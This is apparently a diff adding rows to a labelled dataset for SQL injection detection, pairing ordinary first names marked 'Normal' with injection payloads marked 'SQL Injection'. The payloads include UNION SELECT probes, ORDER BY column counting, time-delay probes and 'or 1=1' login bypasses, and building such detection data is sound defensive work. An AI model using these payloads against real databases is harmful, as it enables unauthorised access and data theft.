+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+'Grace',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+"'admin""""or 1=1 or """"""""=""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+"'' AND MID(VERSION(),1,1) = '5';'",SQL Injection
+'Alice',Normal
+'John',Normal
+'David',Normal
+'Grace',Normal
+'Charlie',Normal
+'Finding the table name',SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Grace',Normal
+'Charlie',Normal
+'Bob',Normal
+'ORDER BY 25',SQL Injection
+'Hank',Normal
+'' AnD SLEEP(5) ANd '1',SQL Injection
+'');,SQL Injection
+'Hank',Normal
+'Jill',Normal
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+'Grace',Normal
+'David',Normal
+'ORDER BY 22--',SQL Injection
+'Grace',Normal
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#'",SQL Injection
+'Charlie',Normal
+'1-true',SQL Injection
+'Bob',Normal
+'Fran',Normal
+'Hank',Normal
+'John',Normal
+'Bob',Normal
+'Hank',Normal
+'Hank',Normal
+"'admin"""" or 1=1#'",SQL Injection
+'Charlie',Normal
+'ORDER BY 23',SQL Injection
+'Hank',Normal
+'UNION ALL SELECT NULL',SQL Injection
+'Eve',Normal
+'Hank',Normal
+'John',Normal
+'Grace',Normal
+'Eve',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--'",SQL Injection
+'Bob',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'Jill',Normal
+'1) or pg_sleep(5)--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Hank',Normal
+'';WAITFOR DELAY '0:0:30'--',SQL Injection
+'John',Normal
+'OR 1=1#',SQL Injection
+'John',Normal
+'Hank',Normal
+"'' or benchmark(10000000,MD5(1))#'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'admin' #',SQL Injection
+'ORDER BY 8#',SQL Injection
+'Hank',Normal
+'Bob',Normal
+'Alice',Normal
+'Charlie',Normal
+'Jill',Normal
+'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'John',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Charlie',Normal
+'Hank',Normal
+"'""""-""""'",SQL Injection
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'' OR 'x'='x',SQL Injection
+'Charlie',Normal
+'-- or #',SQL Injection
